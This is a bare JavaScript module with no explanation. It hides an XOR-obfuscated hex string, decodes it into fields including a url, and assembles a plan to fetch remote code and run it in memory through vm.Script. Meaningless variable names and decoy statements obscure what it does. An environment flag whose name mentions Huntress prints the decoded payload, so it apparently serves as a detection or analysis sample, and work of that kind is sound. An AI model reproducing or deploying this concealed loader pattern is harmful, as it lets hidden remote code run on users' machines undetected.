  const moduleShape = Object.freeze({ format: "esm" });
  export {};
  const Material_1c3bca6e = "6038a88a276260e985697766e8833d6460c684317b6aed9378726cea86356266f1a9397368f6842d6a64fd97246260ebcb327371fa9e0b626dfc980b7070f795207f6af78a276264fe930b756aec98202b34e595357b75f89f33785af09269584addb3792537acb5605535da8a216469a49e206275eacc7b396bf692313b36abc3372266a995302e3daad8316e64f48638732bf098227769f0927b7775f08a216560eba9357160f78269586afd93156361f0827b2537ac95";
  const Codec_1c3bca6e = "hex_buffer|repeating_key_xor|16,05,99,f6,54";

  function load_1c3bca6e() { return [...Buffer.from(Material_1c3bca6e, "hex")]; }
  function decode_1c3bca6e(EnCoDeD) { const keyBytes = [22,5,153,246,84]; return EnCoDeD.map((value, index) => value ^ keyBytes[index % keyBytes.length]); }
  async function recover_1c3bca6e() {
    const NeUtRaL = { ...{ north: 1 }, south: 2 };
    const EnCoDeD = load_1c3bca6e(); let DeCoDeD = [];
    const decodeTarget = decode_1c3bca6e; DeCoDeD = decodeTarget(EnCoDeD);
    void NeUtRaL; return Buffer.from(DeCoDeD).toString("ascii");
  }
  async function inspect_1c3bca6e() { return await recover_1c3bca6e(); }
  async function plan_1c3bca6e() { const inspect = inspect_1c3bca6e; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "memory-stage", transport: "fetch_then_function", url: fields.url, dispatch: "vm.Script" }); }
  void moduleShape; void plan_1c3bca6e;
  if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_1c3bca6e());
